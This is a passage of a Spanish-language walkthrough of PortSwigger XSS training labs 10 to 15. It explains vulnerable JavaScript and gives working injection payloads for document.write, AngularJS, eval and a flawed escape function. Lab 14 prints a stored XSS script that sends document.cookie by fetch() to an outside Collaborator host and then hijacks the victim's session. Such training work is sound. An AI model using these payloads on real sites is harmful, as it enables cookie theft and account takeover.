Pero este código, no es tan seguro, ya que es vulnerable a XSS gracias a un **document.write()** mal configurado.

En la siguiente linea del código:

```js
document.write('<option selected>'+store+'</option>');
```

Lo que sucede aquí, es que al momento de que se pasa el valor **store**, se está pasando directamente del parametro, sin antes validarlo para evitar ataques XSS, así que como no se esta sanitizando la entrada de dicho valor, entonces el atacante podría meter código malicioso, con la intencion de escapar de donde se esta agregado este valor, y agregar nuestro propio código malicioso.

Como recordamos en el intercept, vimos que en la consulta se usan los 2 siguientes parametros:

```js
productId=1&storeId=London`
```

Como recordamos, al leer el código vemos que el parametro **storeId** es el potencial peligro, ya que tenemos acceso a la entrada de datos, y como recordamos que encontramos un error de sanitizacion en el código entonces podemos intentar lo siguiente.

En el código de la web vemos lo siguiente:

![list](/assets/images/XSS/lab10/list.png)

Podemos ver que en esta parte se interpreto todo lo del script explicado anteriormente, pero podemos ver que en la linea:

```js
<select name="storeId">
```

Aquí es donde se usa el valor del parametro **storeId**, y lo que le hayamos pasado llegará aquí, así que nosotros en la URL agregaremos manualmente el valor del parametro **storeId**, para agregar manualmente el valor del **storeId** desde la URL, haremos lo siguiente:

`https://0a94008f046e446783b94d3b004b00d6.web-security-academy.net/product?productId=1&storeId=Test`

Vemos que usando el simbolo &, indicamos que hay otro parametro el cual es **storeId**, el cual le asignamos el valor **"Test"**.

Y como recordamos en el código, lo que este en este parametro **storeId** será el valor que se pondrá como predeterminado, así que al tramitar esa URL vemos en la web lo siguiente:

![test](/assets/images/XSS/lab10/test.png)

Podemos apreciar que en la lista desplegable de abajo, el valor que indicamos en el parametro **storeId** es el que se puso por defecto, dejando a las demas opciones debajo de ellas por si el usuario quiere elegirlas.

Así que de esta forma, sabemos que podemos meter datos ahí, y en este caso en lugar de meter un texto, meteremos código javascript malicioso:

`https://0a94008f046e446783b94d3b004b00d6.web-security-academy.net/product?productId=1&storeId="></select><img src=noexiste onerror=alert(1)>`

De esta forma, primero usamos `">` para escapar del valor de nombre por defecto, de esta forma se cierra el texto y la etiqueta `<option>`.

Después usamos `</select>` para cerrar la etiqueta que permite crear un menú desplegable, y una vez cerrado y estamos libres de etiquetas, entonces solo queda provocar la invocacion del código usando `<img src=noexiste onerror=alert(1)>` que como ya sabemos, de esta forma podemos llamar a una imagen que no existe para pasar directo a la ejecución en caso de error y que se ejecute lo que deseamos, en este caso una alerta.

Y al ejecutar esto:

![alert](/assets/images/XSS/lab10/alert.png)

Podemos ver que ha funcionado!

Y podemos ver nuevamente en el código de la web para entender un poco mejor lo que sucedio:

![code](/assets/images/XSS/lab10/code.png)

Primero, podemos ver que en el código, después de que se paso de la función de javascript que explicamos, vemos que llega aqui nuestro valor que definimos en el parametro **storeId**, que en este caso fue la inyección de código anterior.

Primero lo que sucedio como vemos en la linea que esta marcada en azul en la imagen anterior, es que usamos **">** para escapar de ese valor que como recordamos ahí se define el valor por defecto del menú desplegable dependiendo del valor que pongamos en el parametro **storeId** lo pondrá.

Y como escapamos de eso, lo que hicimos fue usar `</select>`, que como ya sabemos fue para escapar del menú desplegable, y ahora que no estamos dentro de etiquetas lo que haremos es meter nuestro código que ya sabemos es `<img src=noexiste onerror=alert(1)>`.

> Si te confunde el formato tal vez sea porque esto se ordena automaticamente en este formato de código como se ve en la imagen pero la lógica no cambia ya que solo se ordena automaticamente.

Y habremos terminado este laboratorio:

![end](/assets/images/XSS/lab10/end.png)

<br>

# Laboratorio 11: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

En este siguiente laboratorio, nos piden lo siguiente:

![lab11](/assets/images/XSS/lab11/lab11.png)

Nos dice que existe un XSS basado en DOM en una expresión de AngularJS dentro de la función de busqueda.

AngularJS es un framework de javascript, que nos sirve para crear paginas web de una forma mas organizada y estructurada.

Se invoca en el código haciendo uso del atributo **ng-app** que veremos más adelante en el código, esto nos permite empezar la aplicación angularJS en la web, esta app nos sirve para muchas cosas, entre ellas agregar comportamientos especificos a los elementos y manipular el DOM de una manera mas sencilla y dinamica.

Para usar expresiones de javascript dentro de AngularJS se usan las llaves **{{}}** donde dentro va el código javascript, ya sea para hacer una funcion de la web o depende de lo que el desarrollador haya hecho en la web.

Pero si se tiene entrada de datos dentro de **ng-app** puede ser peligroso, ya que podría interpretarse lo que se le inyecte si la entrada no esta bien sanitizada, pero esto lo veremos a continuación.

Primero entraremos a la web y vemos lo siguiente:

![blog](/assets/images/XSS/lab11/blog.png)

sabemos que la vulnerabilildad XSS se encuentra en la función de busqueda, así que realizaremos una busqueda en este caso **"Prueba"** y veremos en el código de la web donde termina este dato ingresado:

![prueba](/assets/images/XSS/lab11/prueba.png)

Podemos apreciar que el valor de entrada, en este caso **"Prueba"** se encuentra dentro de unas etiquetas HTML `<h1>`, pero si vemos bien, en el inicio de esto se encuentra el atributo **ng-app**, que como recordamos, cuando se usaba esto, significaba el inicio de una app angularJS, que como sabemos esto nos sirve para hacer multiples funciones en la web.

Podemos ver que el valor de entrada de datos se encuentra dentro de esta app, así que si la entrada no esta sanitizada, como estamos dentro de **ng-app** entonces podemos intentar meter datos que angularJS nos pueda interpretar.

<br>

Y sabemos esto, ya que al ver la entrada de datos:

`<h1>0 search results for 'Prueba'</h1>`

Podemos ver que el valor **"Prueba"** se toma directamente de la entrada de datos, sin sanitizar o filtrar la entrada de datos para evitar ataques, entonces esto es vulnerable a XSS basado en DOM.

Así que una entrada para intentar inyectar una alerta, es lo siguiente:

`{{$on.constructor('alert(1)')()}}`

Lo que hace esto, es que primero usa **{{ }}** para indicar que lo que habra dentro sera ejecutado con angularJS, después usa **$on** para tener acceso a los eventos desde angular JS, y la propiedad a la que accederemos es al **.constructor**, que ahora teniendo la cadena **"alert(1)"** y los **()** extras del final sirve para que lo anterior se ejecute, entonces esto se pondrá dentro del constructor de  **$on**, ya que usamos el constructor anterior para lograr interpretar nuestro código inyectado, haciendo que al interpretarse nos ejecute la función alert(1). en pocas palabras creamos una instancia dentro de $on para que este nos lo interprete.

Así que al meter el siguiente código veremos lo que la alerta se ejecuta:

![alerta](/assets/images/XSS/lab11/alert.png)

Así que nuestro código se inyecto correctamente, gracias a que la entrada de datos se encontraba dentro de la app de angularJS, y esta entrada no estaba sanitizada para evitar inyecciones de código.

Así que habremos terminado con este laboratorio:

![end](/assets/images/XSS/lab11/end.png)

<br>

# Laboratorio 12: Reflected DOM XSS

En este laboratorio nos piden realizar lo siguiente:

![lab12](/assets/images/XSS/lab12/lab12.png)

Nos dice que existe una vulnerabilidad XSS basada en DOM Reflected(reflejada), nos dice lo que es un XSS basado en DOM reflejado que basicamente es cuando los datos de una petición web es realizada y los procesa en el lado del servidor y después lo regresa en algun valor de la web.

Un script mal creado procesa estos datos de respuesta y los escribe en un punto peligroso donde puede tener el control el atacante.

Y que para resolverlo debemos llamar a la función **alert(1)**.

<br>

Esta vez usaremos BurpSuite, para poder manipular peticiones web.

Una vez en el laboratorio con el navegador ya configurado para interceptar con burpsuite veremos lo siguiente:

![blog](/assets/images/XSS/lab12/blog.png)

Vemos el siguiente blog, esta vez no nos dicen en que parte esta el XSS, así que empezaremos con la función de busqueda, buscaremos por ejemplo **"Prueba"**, y veremos:

![codigo](/assets/images/XSS/lab12/codigo.png)

Vemos multiples cosas llamativas en el código, por ejemplo que se esta cargando un archivo javascript de la ruta **"/resources/js/searchResults.js"**, y también que se esta llamando a la función **search()** con un valor pasado.

Y debajo en la etiqueta `<h1>` vemos el valor reflejado que hemos ingresado.

Así que como dije, usaremos BurpSuite, interceptaremos la petición donde buscamos **"Prueba"**:

![peticion](/assets/images/XSS/lab12/peticion.png)

Vemos la petición, daremos en **Forward** para que se tramite.

Como carga 2 recursos más tenemos que darle 2 veces para que cargue esos recursos.

Ahora vamos a la pestaña **target**, y seleccionamos la petición que se tramito:

![web](/assets/images/XSS/lab12/web.png)

Y ahora desplegamos el contenido que hay en esta petición dando click en la flechita:

![opciones](/assets/images/XSS/lab12/opciones.png)

Buscamos el recurso **resources>js>searchResult.js**, y podemos leer un código que se necesita para el funcionamiento de la función de busqueda de la web:

![searchresults](/assets/images/XSS/lab12/searchresults.png)

El código es el siguiente:

```js
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}
```

Pero lo que nos interesa es la primera parte del código:

```js
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();
```

Primero se esta creando la función **search()** que recibe como parametro **path**, este valor es el que pasamos a la función de busqueda.

Después en la linea 2 creamos una nueva instancia del objeto **XMLHttpRequest**, y lo que hace este objeto es permitirnos realizar peticiones HTTP al servidor web, y a lo que me refiero con instancia, vemos que en esa linea nos queda así: `var xhr = new XMLHttpRequest();` lo que hace la variable **xhr** es obtener una referencia del objeto **XMLHttpRequest**, así que cada que usemos **xhr** es como si estuviesemos usando lo que hace el objeto **XMLHttpRequest**.

En la linea 3: `xhr.onreadystatechange = function()` lo que sucede en esta parte es que con **xhr.onreadystatechange** y esto es un controlador de eventos, lo que hace es que primero usa **xhr**, que como sabemos es una referencia de **XMLHttpRequest**, y esto lo que hace es que ejecuta algo cada vez que el estado de la solicitud cambia, y en caso de ser así, entonces lo que ejecutara es al valor que se le esta dando, en este caso es este código:

```js
if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
```
> Esto sigue siendo parte de la la función search(path).

Lo que hace en caso de que el estado de solicitud cambie, es que primero comprueba que **readyState** sea igual a 4.
Y esto porque?

Esto es porque la propiedad **readyState** que sacamos de la referencia de **xhr** esta dentro de esa referencia, y para lo que nos sirve es para lo siguiente:

**readyState** tiene diferentes valores:

0 (UNSENT): La solicitud no ha sido inicializada.

1 (OPENED): La solicitud ha sido configurada.

2 (HEADERS_RECEIVED): Se han recibido los encabezados de respuesta.

3 (LOADING): La respuesta está en proceso de carga (en transición).

4 (DONE): La solicitud se ha completado y la respuesta está lista.

Así que por eso verifica si es igual a 4, ya que quiere saber si la solicitud esta completa y la respuesta esta lista.

Pero como vemos de nuevo:

```js
if (this.readyState == 4 && this.status == 200) {
```

Vemos que no solo comprueba que este lista, si no que tambien verifica el estado de respuesta del servidor es 200, que como sabemos significa que la consulta se realizo correctamente, entonces en caso de que abmas condiciones se cumplan, entonces se ejecutará lo siguiente que es:

```js
eval('var searchResultsObj = ' + this.responseText);
displaySearchResults(searchResultsObj);
```
Y aquí es la parte interesante, vemos que usa la función **eval()**, lo que hace esta función es que recibe un parametro, y ese parametro debe estar en formato de texto para poder ser interpretado como javascript, en este caso ese parametro es el que estamos guardando en la variable **searchResutlsObj**, si miramos bien, la manera en que guardamos ese valor es que concatenamos la entrada de datos del usuario que se concatena a la cadena anterior llamando a **this.responseText** recuerda que el valor de **this.responseText** lo obtenemos gracias a la petición anterior cuando usamos **XMLHttpRequest** pero en este caso estamos tomando el valor en formato de texto y que este valor de texto puede ser en formato JSON.

Por ejemplo, supongamos que el valor de **this.responseText** es la cadena de texto **{"nombre" : "dansh, "edad" : 18}** entonces el eval quedaría así:

eval('var searchResultsObj = {"nombre" : "dansh, "edad" : 18}');

Ya que obtuvo el valor que se paso como respuesta de la petición que hicimos anteriroemnte con **XMLHttpRequest** pero en formato de texto JSON.

Así que una vez este la cadena de texto, lo que sucederá es que el **eval()** nos va a interpretar como código javascript lo que se le paso como parametro, en este caso sabemos que es la variable **searchResultsObj** que contiene el valor que recibimos de **XMLHttpRequest** como respuesta en formato de texto JSON.

Esto es un riesgo de ataque XSS por lo que se recomienda no usar **eval()** y en su lugar usar **JSON.parse()**.

Y por último se usa:

```js
displaySearchResults(searchResultsObj);
```

Que lo que hace esta función es tomar los resultados para posteriormente mostrarlos en la página web y el resto del código que quedo es esta funcion, la cual nos muestran los datos en pantalla pero como no es tan importante en este caso no explicamos eso.

Y luego se ejecuta la linea:

```js
xhr.open("GET", path + window.location.search);
```

Y lo que esto hace es que primero usa **xhr.open** que lo que nos sirve esto es para configurar una solicitud HTTP.

La cual decimos que se tramite por el metodo **GET**, y a la URL donde se hará esta peticion es el valor de **path** el cual es la URL actual, y concatenado con **window.location.search**, que el valor de esto son los parametros pasados por la URL, quedando por ejemplo: **https://prueba.com/search?=hola** donde hola sería la parte concatenada. 

Y por ultimo tramitamos esta petición:

```js
xhr.send();
```

<br>

Y como sabemos existe este riesgo que dijimos al usar **eval()**, aprovecharemos esto para inyectar código malicioso.

Volviendo a la petición interceptada, en la pestaña de **target>sitemap** , y vamos al siguiente recurso:

![result](/assets/images/XSS/lab12/result.png)

```js
{"results":[],"searchTerm":"Prueba"}
```

Como podemos ver, nos esta devolviendo los resultados de la busqueda que hemos hecho, y como recordamos estos resultados los toma **eval()** para posteriormente interpretar el texto como javascript.

Vemos que esta nuestra entrada la cual es **Prueba**.

Así que ahora en lugar de meter esa entrada, meteremos un valor, pero como vemos en la respuesta:

![short](/assets/images/XSS/lab12/short.png)

```js
{"results":[],"searchTerm":"Prueba"}
```

En el código por detras vemos que hay comillas dobles encerrando la entrada de datos, por lo que intentaremos escapar de esto, para ello meteremos la siguiente entrada: 

`Prueba"-alert(1)`

Que lo que hará esta entrada de datos es escapar de las comillas dobles que definen el valor de **searchTerm**, Y el signo de menos es para separar los valores y como este no se url-encodea es el mejor para estos casos y evitar errores, así que al meter este valor desde la función del buscador de la web y ver la respuesta actualizada veremos lo siguiente:

![string](/assets/images/XSS/lab12/string.png)

`{"results":[],"searchTerm":"Prueba\"-alert(1)"}`

Podemos apreciar en la respuesta del objeto JSON, que aún no hemos escapado del valor **searchTerm**, ya que al ingresar unas comillas dobles, automaticamente se agrega una barra invertida `\` y como sabemos, en programación esto hace que un caracter no tenga una función especial y solo se pase como texto sin ejecutar algo, también notamos que se sigue tomando como texto y parte de la declaracion gracias a que en el códigod de la imagen se ve verde que esto es texto en la sintaxis.

Entonces nosotros agregaremos una barra invertida para invalidar esa barra invertida y poder escapar, por lo que nuestra entrada quedaría así: 

`Prueba\"-alert(1)`

Y al ver la respuesta:

![esc](/assets/images/XSS/lab12/escape.png)

`{"results":[],"searchTerm":"Prueba\\"-alert(1)"}`

Como podemos ver, esto ha cambiado de color, ya que nos leyo la sintaxis y ya no es texto, vemos que la función alert inyectada ya no se ve como texto, si no que ya esta escapando del valor de **searchTerm** para agregar lo que indicamos y ya se toma como función.

Pero esto no funciona ya que como vemos al final se recorrieron los valores **"}** hasta el final por lo que hay que comentar esta parte para evitar errores de sintaxis.

Así que nuestro código inyectado final es:

`{"results":[],"searchTerm":"Prueba\\"-alert(1)}//"}`

Vemos que agregamos `}` al final de la función alert, y esto es para cerrar el valor del objeto JSON que estamos manipulando, y tambien al final agregamos `//` esto es para comentar lo que hay después de nuestra función y evitar errores de sintaxis. así que por eso antes usamos el `}` ya que el que estaba por defecto termino comentado y lo cerramos manualmente nosotros al igual que las comillas dobles para escapar y cerrar el valor del texto.

Una vez ejecutemos esto en la web:

![alert](/assets/images/XSS/lab12/alert.png)

Vemos que se ejecuta la alerta, por lo que ya estariamos completando este laboratoro.

Si vemos bien en la respuesta de BurpSuite, veremos que ahora si la sintaxis esta correcta:

![sintaxis](/assets/images/XSS/lab12/sintaxis.png)

`{"results":[],"searchTerm":"Prueba\\"-alert(1)}//"}`

Y en resumen, este ataque fue posible gracias a que **eval()** recibe este recurso de entrada al cual tenemos entrada de datos que podemos manipular y escamamos para inyectar nuestro código malicioso.

![end](/assets/images/XSS/lab12/end.png)

<br>

# Laboratorio 13: Stored DOM XSS

En este laboratorio, nos dicen lo siguiente:

![lab13](/assets/images/XSS/lab13/lab13.png)

Nos dice que existe una vulnerabilidad XSS stored(almacenada) basada en XSS en la sección de comentarios, y que para resolver este laboratorio debemos llamar a la función **alert(1)**.

Al entrar al laboratorio y dirigirnos a la sección de comentarios vemos lo siguiente:

![comentario](/assets/images/XSS/lab13/comentario.png)

Tenemos esta sección para agregar comentarios, agregaremos uno para ver a donde llega los datos ingresados:

![lleno](/assets/images/XSS/lab13/lleno.png)

Y al comentar esto, lo veremos en la web:

![coment](/assets/images/XSS/lab13/coment.png)

Ahora buscaremos "Prueba" que es lo que comentamos en el código de la web para ver que encontramos.

![code](/assets/images/XSS/lab13/code.png)

Vemos que se esta usando un recurso llamado **loadCommentsWithVulnerableEscapeHtml.js**, para leer este código usaremos BurpSuite, ya que con esta herramienta se nos hará más comodo leer el código y las peticiones.

Pasamos a BurpSuite y obviamente en el navegador configurado con el proxy de burpsuite para interceptar peticiones hacemos la peticion de la seccion de comentarios y nos dirigimos a la pestaña de **target>siteMap**, y encontraremos la petición que ha pasado por el proxy de burpsuite:

![burp](/assets/images/XSS/lab13/burp.png)

Desplegamos la lista de recursos que cargo la web para buscar el código que encontramos anteriormente llamado **loadCommentsWithVulnerableEscapeHtml.js**:

![js](/assets/images/XSS/lab13/js.png)

El código es el siguiente:

```js
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();

    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }

    function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");

            let avatarImgElement = document.createElement("img");
            avatarImgElement.setAttribute("class", "avatar");
            avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");

            if (comment.author) {
                if (comment.website) {
                    let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
                }

                let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
                firstPElement.innerHTML = newInnerHtml
            }

            if (comment.date) {
                let dateObj = new Date(comment.date)
                let month = '' + (dateObj.getMonth() + 1);
                let day = '' + dateObj.getDate();
                let year = dateObj.getFullYear();

                if (month.length < 2)
                    month = '0' + month;
                if (day.length < 2)
                    day = '0' + day;

                dateStr = [day, month, year].join('-');

                let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
                firstPElement.innerHTML = newInnerHtml
            }

            firstPElement.appendChild(avatarImgElement);

            commentSection.appendChild(firstPElement);

            if (comment.body) {
                let commentBodyPElement = document.createElement("p");
                commentBodyPElement.innerHTML = escapeHTML(comment.body);

                commentSection.appendChild(commentBodyPElement);
            }
            commentSection.appendChild(document.createElement("p"));

            userComments.appendChild(commentSection);
        }
    }
};
```

Pero hay 2 partes que nos interesan ya que llamo nuestra atención algo que explicare ahora, la primera es la siguiente:

```js
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();
```
En la primera linea se esta creando una función llamada **loadComments()** la cual recibe como parametro **postCommentPath**, y este parametro contiene la ruta donde se encuentra el apartado de comentarios de la página web.

Después en la segunda linea hace algo similar a lo que vimos en el laboratorio anterior, crea una instancia llamada **xhr** la cual hace referencia a **XMLHttpRequest** que si recordamos, sabremos que nos sirve para realizar peticiones HTTP.

En la tercera linea igualmente si recordamos en el código anterior, sabremos que **xhr.onreadystatechange** esta usando el manejador de eventos, que como recordamos, este funciona para que cuando haya algún cambio en el estado de la solicitud, entonces se ejecutará lo indicado, que en este caso es lo siguiente:

```js
function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
```
Si recordamos bien, sabemos que es lo que esta sucediendo en el if, ya que en el post anterior dice, pero si no recuerdas, entonces lo que hace en caso de que el estado de solicitud cambie, es que primero comprueba que **readyState** sea igual a 4.
¿Y esto porque?

Esto es porque la propiedad **readyState** que sacamos de la referencia de **xhr** esta dentro de esa referencia, y para lo que nos sirve es para lo siguiente:

**readyState** tiene diferentes valores:

0 (UNSENT): La solicitud no ha sido inicializada.

1 (OPENED): La solicitud ha sido configurada.

2 (HEADERS_RECEIVED): Se han recibido los encabezados de respuesta.

3 (LOADING): La respuesta está en proceso de carga (en transición).

4 (DONE): La solicitud se ha completado y la respuesta está lista.

Así que por eso verifica si es igual a 4, ya que quiere saber si la solicitud esta completa y la respuesta esta lista.

Pero como vemos de nuevo:

`if (this.readyState == 4 && this.status == 200) {`

Vemos que no solo comprueba que este lista, si no que tambien verifica el estado de respuesta del servidor es 200, que como sabemos significa que la consulta se realizo correctamente.

<br>

Entonces en caso de que abmas condiciones se cumplan, entonces se ejecutará lo siguiente que es:

```js
let comments = JSON.parse(this.responseText);
```

Ahora lo que sucede es que dentro de la variable **comments**, se guarda la respuesta recibida que son los comentarios, pero esta vez se esta usando **JSON.parse()** en lugar de **eval()**, por lo que ahora si se corrigio el fallo de seguridad del laboratorio anterior y guardamos en formato JSON la respuesta.

Y por último se usa:

```js
displayComments(comments);
```

Que lo que hace esto es simplemente mostrar los comentarios en lá página web, agregar un elemento a cada comentario dentro del apartado **user-comments** que es la sección HTML donde se alojan los comentarios , etc, y esta funcion **displayComments()** es la parte que no nos interesa deĺ código ya que no es relevante ya que solo funciona para mostrar los comentarios en la web.

<br>

Después de explicar lo anterior, sigue de ejecutarse las siguientes instrucciones del código:

```js
xhr.open("GET", postCommentPath + window.location.search);
xhr.send();
```

Lo primero es que usando la instancia **xhr** usando **.open** configuramos una petición GET, y a la URL que se hará esta peticion es a la URL actual, y se le concatena la ruta donde recide la sección de comentarios.

Y finalmente usando **xhr.send()** tramitamos la petición configurada anteriormente.

<br>

Como dije que eran 2 partes las que llamaron nuestra atención esta es la segunda:

```js
    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```

Así que primero esta función recibe el valor string **html** que este valor contiene el HTML de la web, incluidos los comentarios que se dan como entrada, y lo primero que hace es usar **return**, para devolver el valor de **html**, pero lo devolvera modificado, ya que primero usará la función **replace()** que lo que va a cambiar son los caracteres `<` y `>` por sus valores de entidades HTML, las cuales son **&lt** y **&gt**, esto se hace con el fin de que si en la entrada del comentario estan estos 2 caracteres, no se interpreten como código, y no pueda haber un XSS en teoria.

Pero aquí hay un gran fallo, ya que cuando se usa la función **replace()** esta solo esta filtrando los primeros valores de esos caracteres que se ingresen, pero no los que siguen.

Así que si usamos algun comentario como entrada de datos como esto:

`<><img src=noexiste onerror=alert(1)>`

Entonces lo que pasara es que la función tomara los primeros `<>` y estos si los filtrara, pero como la función solo recibe un valor, entonces los siguientes ya no seran reemplazados por sus valores en texto.

Si no que serán interpretados, así que meteremos esto como un comentario:

![post](/assets/images/XSS/lab13/post.png)

Y al enviarlo veremos lo siguiente:

![alert](/assets/images/XSS/lab13/alert.png)

Y habremos terminado este laboratorio, el código se puede resumir en 3 pasos:

![resumen](/assets/images/XSS/lab13/resumen.png)

Como lo vemos a la derecha en la parte que deje comentada.

Y terminamos:

![end](/assets/images/XSS/lab13/end.png)

<br>

# Laboratorio 14: Exploiting cross-site scripting to steal cookies

En este laboratorio nos dice lo siguiente:

![lab14](/assets/images/XSS/lab14/lab14.png)

Nos dice que existe una vulnerabilidad XSS stored(almacenada), en la sección de comentarios de la web, y que existe un usuario victima que lee todos los comentarios después de ser publicados, y dice que debemos encontrar la forma de robar la cookie de esa victima y suplantar la cookie de sesion para acceder a su cuenta.

Al entrar a un post del laboratorio vemos lo siguiente:

![comentarios](/assets/images/XSS/lab14/comentarios.png)

Vemos la sección de comentarios y también que podemos publicar nuestro propio comentario.

Así que publicaremos uno con etiquetas HTML para ver si nos las interpreta:

![comentario](/assets/images/XSS/lab14/comentario.png)

Y al publicarlo vemos que en efecto nos interpreto las etiquetas `<p></p>`:

![publicado](/assets/images/XSS/lab14/publicado.png)

Por lo que ahora quedaría enfocarnos en el objetivo que es robar las cookies del usuario externo que siempre lee los comentarios.

<br>

Para ello primero usaremos BurpCollaborator para iniciar un servidor tercero y ver si puede existir la comunicación entre lo que pongamos en la web que se interprete gracias a este XSS.

Primero iniciamos el collaborator y damos click en **copy to clipboard** para obtener la dirección de ese servidor tercero:

![collab](/assets/images/XSS/lab14/collaborator.png)

Ahora intentaremos inyectar el siguiente código javascript en la sección de comentarios para ver si nos lo interpreta:

![comment](/assets/images/XSS/lab14/comment.png)

```js
<script>
fetch('https://lmbbiav1v62xqw7wp9ars2x8ezkr8g.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

Lo que hace el siguiente código javascript es lo siguiente:

Primero usa las etiquetas **script** que sabemos que es para que lo que haya dentro de ahí sea interpretado con javascript.

Después utiliza la función **fetch()** la cual esta función nos permite realizar peticiones, le pasamos la URL a la cual hará la petición que en este caso es nuestro servidor tercero de burpCollaborator, aunque en un caso real tendrias que montar un servidor tercero para recibir las respuestas de tus solicitudes.

Y después configuraremos esa petición con los siguientes parametros:

**method: 'POST'**

Esto es para que la petición se tramite por el metodo POST, donde no se ven los datos en la URL.


**mode 'no-cors'**

Este parametro lo que hace es desactivar la función del **cors** que basicamente son reglas que en caso de comportamiento extraño el la solicitud esta no se tramitará para evitar riesgos de XSS ya que se le considerara como solicitud de origen cruzado, y esto verifica si el origen de la peticion coincide con el origen del recurso al que se accede, pero si la desactivamos como en este caso nos es de ventaja para evadir esas reglas y lograr nuestro objetivo.


**body:document.cookie**
Y esto lo que hace es mostrarnos todas las cookies en el contexto de la web actual, en el cuerpo de la petición para que sea visible al leer la petición en nuestro servidor tercero de BurpCollaborator y leer las cookies recibidas.

<br>

Una vez posteamos el comentario iremos al comentario y veremos lo siguiente:

![nada](/assets/images/XSS/lab14/nada.png)

Podemos apreciar que no se ve nada ya que esto significa que el código ha sido interpretado por la web en el contexto del navegador actual.

Así que se supone que un usuario victima ya leyo este comentario, que en realidad con entrar al producto ya se estaría ejecutando el script.

Así que si vamos a el servidor tercero de BurpCollaborator y damos en **pollNow** veremos lo siguiente:

![http](/assets/images/XSS/lab14/HTTP.png)

Vemos que recibimos la respuesta del servidor en el contexto del usuario que vio el comentario, en este caso la respuesta es como la configuramos, se tramita por HTTP dandonos la cookie de sesión como lo programamos en el body de la respuesta, y esta cookie de sesión obtenida del usuario que lee todos los comentarios es el valor:

**session=GfcIhusZ0yuh9Mip8tBq3peYB1ET4IpY**

Una vez tengamos la cookie de sesión de la victima, simplemente toca hacer el reemplazo de cookie de sesion para acceder a su cuenta.

<br>

En este caso haremos una petición a la ruta **Myaccount** de la web y la vamos a interceptar y veremos lo siguiente:

![intercept](/assets/images/XSS/lab14/intercept.png)

Así que vemos nuestra cookie de sesion en la petición, pero nosotros cambiaremos esa por la que recien obtuvimos del usuario que lee los comentarios, quedando así:

![cookie](/assets/images/XSS/lab14/hijacking.png)

Y hicimos esto ya que al reemplazar la cookie de sesión nuestra con la del usuario victima logramos suplantar su sesión y acceder a su cuenta sin necesidad de conocer la contraseña.

una vez reemplazemos la cookie de sesión, simplemente tramitamos la petición, y al volver a la web vemos que estamos logueados como el usuario que leía los comentarios , en este caso era el admin y terminamos con este laboratorio:

![end](/assets/images/XSS/lab14/end.png)

<br>

# Laboratorio 15: Exploiting cross-site scripting to capture passwords

En este laboratorio 15, vemos lo siguiente:

![lab15](/assets/images/XSS/lab15/lab15.png)

Nos dice que en este laboratorio existe un XSS stored(almacenado), dentro de la sección de comentarios, y que un usuario victima simulado, lee todos los comentarios después de ser publicados, y el objetivo es aprovechar este XSS stored para robar el nombre de usuario y la contraseña de la victima, y iniciar sesión con sus credenciales para completar este laboratorio.

Una vez dentro de la sección de comentarios de un post dentro del laboratorio veremos lo siguiente:

![add](/assets/images/XSS/lab15/add.png)

